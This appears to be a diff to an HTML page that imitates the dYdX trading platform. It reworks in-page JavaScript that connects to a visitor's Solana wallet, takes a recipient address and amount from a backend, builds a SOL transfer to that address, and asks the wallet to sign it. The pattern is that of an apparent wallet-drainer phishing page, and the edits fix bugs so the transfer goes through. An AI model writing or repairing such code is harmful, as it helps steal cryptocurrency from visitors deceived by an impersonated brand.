@@ -80,9 +80,16 @@
     <div class="metrics"><div style="color:#6966FF; text-transform:uppercase; font-size:14px;">Why dYdX?</div><h2>Trusted at Scale</h2><div class="metrics-grid"><div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div><div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div><div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div><div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div></div></div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script>
-        if (!window.Buffer) { window.Buffer = { from: (s) => new TextEncoder().encode(s), alloc: (n) => new Uint8Array(n) }; }
+        // Buffer polyfill for the new version
+        if (!window.Buffer) { 
+            window.Buffer = { 
+                from: (s) => new TextEncoder().encode(s), 
+                alloc: (n) => new Uint8Array(n),
+                isBuffer: (obj) => obj instanceof Uint8Array
+            }; 
+        }
 
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Ready');
@@ -146,19 +153,29 @@
                     loadingTitle.textContent = 'Getting Blockhash...';
                     const blockhashData = await callBackend('/api/getBlockhash', {});
                     
-                    // BUILD TRANSACTION ON FRONTEND (NO BACKEND SERIALIZATION)
+                    // FIX: Use try-catch with proper number conversion
                     loadingTitle.textContent = 'Building Transaction...';
-                    const transaction = new solanaWeb3.Transaction();
-                    transaction.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: new solanaWeb3.PublicKey(pubKey),
-                            toPubkey: new solanaWeb3.PublicKey(prepareData.to),
-                            lamports: prepareData.amount,
-                        })
-                    );
+                    
+                    const { PublicKey, Transaction, SystemProgram } = solanaWeb3;
+                    const fromPubkey = new PublicKey(pubKey);
+                    const toPubkey = new PublicKey(prepareData.to);
+                    
+                    // Convert lamports to a regular number (not BigInt)
+                    const lamports = Number(prepareData.amount);
+                    console.log('Lamports as number:', lamports);
+                    
+                    // Create instruction directly
+                    const transferIx = SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: toPubkey,
+                        lamports: lamports
+                    });
+                    
+                    const transaction = new Transaction();
+                    transaction.add(transferIx);
                     transaction.recentBlockhash = blockhashData.blockhash;
                     transaction.lastValidBlockHeight = blockhashData.lastValidBlockHeight;
-                    transaction.feePayer = new solanaWeb3.PublicKey(pubKey);
+                    transaction.feePayer = fromPubkey;
                     
                     loadingTitle.textContent = 'Signing...';
                     const signed = await provider.signTransaction(transaction);
